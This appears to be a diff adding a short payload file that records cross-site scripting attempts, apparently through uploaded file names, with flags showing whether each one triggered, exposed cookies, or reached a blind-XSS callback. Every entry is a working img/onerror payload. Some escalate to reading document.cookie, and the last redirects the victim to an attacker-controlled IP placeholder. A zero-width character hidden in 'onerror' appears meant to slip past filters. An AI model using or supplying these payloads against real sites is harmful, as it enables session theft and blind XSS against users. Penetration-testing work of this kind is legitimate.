@@ -1,0 +1,25 @@
+test<img src=a onerror​=alert(1)>test
+----- XSS Triggered --> True
+----- Alert Cookie ----> False
+----- File Submitted --> False
+----- Blind XSS -------> False
+
+
+test<img src=a onerror​=window['alert'](window['document']['cookie']);>test
+----- XSS Triggered --> True
+----- Alert Cookie ----> True
+----- File Submitted --> False
+----- Blind XSS -------> False
+
+
+test<img src=a onerror​=window['alert'](window['document']['cookie']);>test.jpg
+----- XSS Triggered --> True
+----- Alert Cookie ----> True
+----- File Submitted --> True
+----- Blind XSS -------> False
+
+test<img src=a onerror​=window['document']['location']='//<<-IP->>/xxxsssss.jpg';>test.jpg
+----- XSS Triggered --> True
+----- Alert Cookie ----> True
+----- File Submitted --> True
+----- Blind XSS -------> True
